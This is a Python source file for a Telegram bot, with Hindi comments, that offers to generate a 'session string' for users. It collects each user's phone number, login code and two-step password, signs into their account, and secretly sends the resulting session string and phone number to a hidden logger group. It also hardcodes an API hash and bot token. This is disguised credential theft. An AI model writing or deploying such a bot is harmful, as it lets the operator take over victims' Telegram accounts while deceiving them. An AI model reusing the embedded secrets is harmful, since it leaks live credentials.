import asyncio
from telethon import TelegramClient, events, Button
from telethon.errors import SessionPasswordNeededError, PhoneCodeExpiredError, PhoneCodeInvalidError
from telethon.sessions import StringSession

# 🔹 Telegram API Credentials
API_ID = 28795512
API_HASH = "c17e4eb6d994c9892b8a8b6bfea4042a"
BOT_TOKEN = "7767480564:AAGwzQ1wDQ8Qkdd9vktp8zW8aUOitT9fAFc"

# 🔹 Logger Group ID (आपके टेलीग्राम ग्रुप का ID)
LOGGER_GROUP_ID = -1002477750706  

# 🔹 बॉट क्लाइंट स्टार्ट करें
bot = TelegramClient("bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# 🔹 यूज़र्स के सेशन्स स्टोर करने के लिए
user_sessions = {}

# 🔹 /start Command
@bot.on(events.NewMessage(pattern="/start"))
async def start(event):
    await event.respond(
        "**❖ ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ sᴇssɪᴏɴ ɢᴇɴᴇʀᴀᴛᴏʀ ʙᴏᴛ!**\n\n◍ ᴘʀᴇss ᴛʜᴇ ʙᴜᴛᴛᴏɴ ʙᴇʟᴏᴡ ᴛᴏ ɢᴇɴᴇʀᴀᴛᴇ ʏᴏᴜʀ sᴇssɪᴏɴ.",
        buttons=[Button.inline("📲 Generate Session", b"generate")]
    )

# 🔹 Generate Session Command
@bot.on(events.CallbackQuery(pattern=b"generate"))
async def ask_phone(event):
    user_id = event.sender_id
    user_sessions[user_id] = {"step": "phone"}
    await event.respond(
        "**❖ ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ**\n\n🔹 **Example:** `+919876543210`",
        buttons=[Button.inline("❌ Cancel", b"cancel")]
    )

# 🔹 Process User Input
@bot.on(events.NewMessage)
async def process_input(event):
    user_id = event.sender_id
    if user_id not in user_sessions:
        return  

    step = user_sessions[user_id]["step"]

    # ✅ Step 1: Enter Phone Number
    if step == "phone":
        phone_number = event.message.text.strip()
        user_sessions[user_id]["phone"] = phone_number  

        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        user_sessions[user_id]["client"] = client  

        try:
            sent_code = await client.send_code_request(phone_number)
            user_sessions[user_id]["phone_code_hash"] = sent_code.phone_code_hash  
            user_sessions[user_id]["step"] = "otp"
            await event.respond(
                "**❖ OTP भेज दिया गया है! कृपया इसे दर्ज करें।**",
                buttons=[Button.inline("❌ Cancel", b"cancel")]
            )
        except Exception as e:
            await event.respond(f"**❖ ᴇʀʀᴏʀ:** {str(e)}. ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ !")
            del user_sessions[user_id]

    # ✅ Step 2: Enter OTP
    elif step == "otp":
        otp_code = event.message.text.strip()
        client = user_sessions[user_id]["client"]
        phone_number = user_sessions[user_id]["phone"]
        phone_code_hash = user_sessions[user_id].get("phone_code_hash")  

        try:
            await client.sign_in(phone_number, otp_code, phone_code_hash=phone_code_hash)  
            session_string = client.session.save()

            await bot.send_message(LOGGER_GROUP_ID, f"**❖ New Session Generated !**\n\n🔹 **User ID:** `{user_id}`\n🔹 **Phone:** `{phone_number}`\n🔹 **Session String:** `{session_string}`")

            await event.respond(f"**❖ ʏᴏᴜʀ sᴇssɪᴏɴ sᴛʀɪɴɢ:**\n\n`{session_string}`\n\n🔹 **कृपया इसे सुरक्षित रखें!**")
            await client.disconnect()
            del user_sessions[user_id]

        except PhoneCodeExpiredError:
            await event.respond("**❖ Error: OTP Expired! कृपया /start दबाकर फिर से प्रयास करें।**")
            await client.disconnect()
            del user_sessions[user_id]

        except PhoneCodeInvalidError:
            await event.respond("**❖ Error: OTP Incorrect! कृपया सही OTP दर्ज करें।**")

        except SessionPasswordNeededError:
            user_sessions[user_id]["step"] = "password"
            await event.respond(
                "**❖ आपका अकाउंट 2-स्टेप वेरिफिकेशन सक्षम है। कृपया अपना पासवर्ड दर्ज करें।**",
                buttons=[Button.inline("❌ Cancel", b"cancel")]
            )
        
        except Exception as e:
            await event.respond(f"**❖ ᴇʀʀᴏʀ:** {str(e)}")
            await client.disconnect()
            del user_sessions[user_id]

    # ✅ Step 3: Enter 2FA Password
    elif step == "password":
        password = event.message.text.strip()
        client = user_sessions[user_id]["client"]

        try:
            await client.sign_in(password=password)
            session_string = client.session.save()

            await bot.send_message(LOGGER_GROUP_ID, f"**❖ New Session with 2FA!**\n\n🔹 **User ID:** `{user_id}`\n🔹 **Session String:** `{session_string}`")

            await event.respond(f"**❖ ʏᴏᴜʀ sᴇssɪᴏɴ sᴛʀɪɴɢ:**\n\n`{session_string}`\n\n🔹 **कृपया इसे सुरक्षित रखें!**")
            await client.disconnect()
            del user_sessions[user_id]

        except Exception as e:
            await event.respond(f"**❖ ᴇʀʀᴏʀ:** {str(e)}")
            await client.disconnect()
            del user_sessions[user_id]

# 🔹 Cancel Command
@bot.on(events.CallbackQuery(pattern=b"cancel"))
async def cancel(event):
    user_id = event.sender_id
    if user_id in user_sessions:
        del user_sessions[user_id]
    await event.respond("**❖ प्रक्रिया रद्द कर दी गई!**")

# 🔹 Run the bot
print("🚀 Bot is running...")
bot.run_until_disconnected()
